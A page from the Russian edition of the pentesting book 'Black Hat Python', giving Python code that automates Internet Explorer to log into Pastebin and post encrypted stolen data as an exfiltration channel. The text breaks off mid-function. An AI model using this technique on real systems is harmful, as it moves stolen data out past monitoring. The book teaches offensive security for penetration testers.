# Black Hat Python. Программирование для хакеров и пентестеров — страница 183

Источник: `Black Hat Python. Программирование для хакеров и пентестеров.pdf`

Вывод похищенных данных с помощью веб-сервера   183
с DOM. К счастью, в Python этот этап можно очень легко автоматизировать.
Добавим еще немного кода:
def login(ie):
    full_doc = ie.Document.all 
    for elem in full_doc:
        if elem.id == 'loginform-username': 
            elem.setAttribute('value', username)
        elif elem.id == 'loginform-password':
            elem.setAttribute('value', password)
    random_sleep()
    if ie.Document.forms[0].id == 'w0':
        ie.document.forms[0].submit()
    wait_for_browser(ie)
Функция login первым делом извлекает все элементы в DOM . Она ищет
поля с именем пользователя и паролем , присваивая им предоставленные
нами учетные данные (не забудьте зарегистрироваться). После выполнения
этого кода вы должны попасть на информационную панель Pastebin и быть
готовы к публикации данных. Добавим соответствующий код:
def submit(ie, title, contents):
    full_doc = ie.Document.all
    for elem in full_doc:
        if elem.id == 'postform-name':
            elem.setAttribute('value', title)
        elif elem.id == 'postform-text':
            elem.setAttribute('value', contents)
    if ie.Document.forms[0].id == 'w0':
        ie.document.forms[0].submit()
    random_sleep()
    wait_for_browser(ie)
В этом коде вам уже все должно быть знакомо. Мы просто проходимся по
DOM, чтобы найти места, в которых можно указать заголовок и тело публи-
куемого фрагмента. Функция submit принимает экземпляр браузера вместе
с именем и содержимым зашифрованного файла, который нужно отправить.
Итак, мы вошли в Pastebin и выполнили POST-запрос. Т еперь добавим
в скрипт завершающие штрихи:
def ie_paste(title, contents):
    ie = client.Dispatch('InternetExplorer.Application') 
    ie.Visible = 1 
